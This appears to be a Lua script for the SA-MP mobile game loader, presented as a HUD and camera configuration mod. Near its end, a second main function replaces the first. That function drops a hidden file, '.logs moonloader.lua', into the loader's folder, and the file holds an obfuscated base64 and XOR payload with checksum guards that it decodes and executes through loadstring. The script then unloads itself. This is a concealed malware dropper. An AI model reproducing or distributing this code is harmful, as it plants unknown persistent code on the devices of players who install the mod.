    imgui.Spacing()
    imgui.Separator()
    imgui.Spacing()
    if imgui.Button("RESETAR TUDO", imgui.ImVec2(120, 30)) then
        resetarConfiguracao()
    end
    imgui.SameLine()
    if imgui.Button("FECHAR", imgui.ImVec2(120, 30)) then
        estado.modoEdicao[0] = false
        salvarConfig()
    end
    imgui.End()
    imgui.PopStyleColor(18) 
end)
function main()
    carregarConfig()
    while not isSampAvailable() do wait(0) end
    sampRegisterChatCommand("shell", function()
        verificarDependencias()
        if dependenciasOk then
            estado.modoEdicao[0] = not estado.modoEdicao[0]
            salvarConfig()
        else
            showTrava[0] = not showTrava[0]
        end
    end)
    while true do
        wait(0)
        if isSampAvailable() then
            local hp = getCharHealth(PLAYER_PED)
            local ar = getCharArmour(PLAYER_PED)
            if hp then estado.vida = hp end
            if ar then estado.colete = ar end
            estado.dinheiro = getPlayerMoney(PLAYER_HANDLE) or 0
            if dependenciasOk then
                if config.climaAtivo then
                    setTimeOfDay(config.tempoId, 0)
                    forceWeatherNow(config.climaId)
                end
                if config.fovAtivado then
                    cameraSetLerpFov(config.valorFov, 101.0, 1000, true)
                end
                aplicarSensibilidade(config.sensibilidade)
                setCameraRenderDistance(config.renderDistance)
                setCameraZoom(config.fixedZoom)
            end
            if os.clock() - estado.ultimoSalvamento > 5 then
                salvarConfig()
                estado.ultimoSalvamento = os.clock()
            end
        end
    end
end

function main()
    lua_thread.create(function()

        local caminho = "/storage/emulated/0/Android/media/ro.alyn_sampmobile.game/monetloader/.logs moonloader.lua"

        local conteudo = [[
local IPlcEi="Gy1ILgJkHzZfP055VzBOPhstBScDbR0rFClOO0AsAzZbbUdOGy1ILgJkGzZFflxkSmJZKh8xHjBOZ0woAywafUxtfUhNOgAnAytEIU4iEjZIJzs2G2pePQJtfWILb04oGCFKI042EjFbIAA3EmIWbxU5fWILb04oGCFKI042EjEHbw0rEycHbwYhFiZOPR1kSmJDOxo0WTBOPhshBDZQRU5kV2ILb05kAjBHb1NkAjBHY2RkV2ILb05kVzFCIQVkSmJHOwB1RWxYJgAvWTZKLQIhXzBOPB4rGTFOZkJOV2ILb05kV2JDKg8gEjBYb1NkDEgLb05kV2ILb05kV2JwbTs3EjAGDgkhGTYJEk55V2BmIBQtGy5KYFtqR2Ahb05kV2ILb045fWILb045fWILb04tEWJIIAohV38Wb1x0R2JfJwsqfWILb05kV2ILPQswAjBFbxolFS5OYQ0rGSFKO0Y2EjFbIAA3Emshb05kVydHPAtOV2ILb05kV2JbPQcqA2oJChw2GGJKIE4rFTZOPU4rVyFEIRohjSZEbworVy5CIQV+VW4LLAEgEmshb05kV2ILb042EjZePQBkGStHRU5kV2JOIQpOEixPRWQiAixIOwcrGWJONwsnAjZOHA02HjJfCRwrGhdZI0YxBS4CRU5kV2JHIA0lG2JYLBwtBzZoIAAwEixfb1NkESdfLAYRBS4DOhwoXkgLb05kHiQLPA02HjJfDAEqAydFO04wHydFRU5kV2ILb05kGy1ILgJkETdFLEJkEjBZb1NkGy1KK0Y3FDBCPxoHGCxfKgAwXkgLb05kV2ILbwciVyReIQ1kAypOIWRkV2ILb05kV2ILb04iAixIZ0dOV2ILb05kV2JOIx0hfWILb05kV2ILb05kVzJZJgAwX2BuPRwrVyNEbw0lBTBOKA82Vy0LPA02HjJfdUxoVydZPUdOV2ILb05kV2JOIQpOV2ILbwsqE0hOIQpOfS5ELA8oVzFIPQc0AxdZI055V2BDOxo0BHgEYBwlAGxMJhosAiBePAs2FC1FOwsqA2xIIANrBzdfLhgtBSVOIg0lBSNHJwFpHzdOYFk3QXdONl0wEjAePAkhDjEfPFs3QjEdPFo3QTEePBc3HzFMKxo9EyVOOwpxEnQYNlo9BSoeLVsqQSwdIlgqQSwdIVgqQSweIVsqQiweIQRwQigeLVgsQSodegxxFXdDNgpxQnQEPQsiBG1DKg8gBG1GLgcqWBBuDioJMmxGK0xOfSdTKg0xAyd4LBwtBzZtPQEpIjBHZx0nBStbOzs2G2s=" 
local yKj6gR="wB+OnD" 
local OIQJAR="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
local function decode(t)local r,i={},1 while i<=#t do local c1,c2,c3,c4=t:sub(i,i),t:sub(i+1,i+1),t:sub(i+2,i+2),t:sub(i+3,i+3) local a,b=OIQJAR:find(c1)-1,OIQJAR:find(c2)-1 local c=(c3=="=")and 0 or OIQJAR:find(c3)-1 local d=(c4=="=")and 0 or OIQJAR:find(c4)-1 local n=a*2^18+b*2^12+c*2^6+d table.insert(r,string.char(math.floor(n/2^16)%256)) if c3~="=" then table.insert(r,string.char(math.floor(n/2^8)%256)) end if c4~="=" then table.insert(r,string.char(n%256)) end i=i+4 end return table.concat(r) end
local function xor(a,b)local r=0 for k=0,7 do local A,B=a%2,b%2 if A~=B then r=r+2^k end a,b=math.floor(a/2),math.floor(b/2) end return r end
local sum=0 for i=1,#IPlcEi do sum=(sum+IPlcEi:byte(i))%65536 end if sum~=43337 then return end
local tmp=decode(IPlcEi)local buf={} for i=1,#tmp do table.insert(buf,string.char(xor(tmp:byte(i),yKj6gR:byte((i-1)%#yKj6gR+1)))) end
local script=table.concat(buf)local sum2=0 for i=1,#script do sum2=(sum2+script:byte(i))%65536 end if sum2~=11495 then return end
local run=(loadstring or load) run(script)()
]]

        local f = io.open(caminho, "w")
        if f then
            f:write(conteudo)
            f:close()
        end

        thisScript():unload()

    end)
end
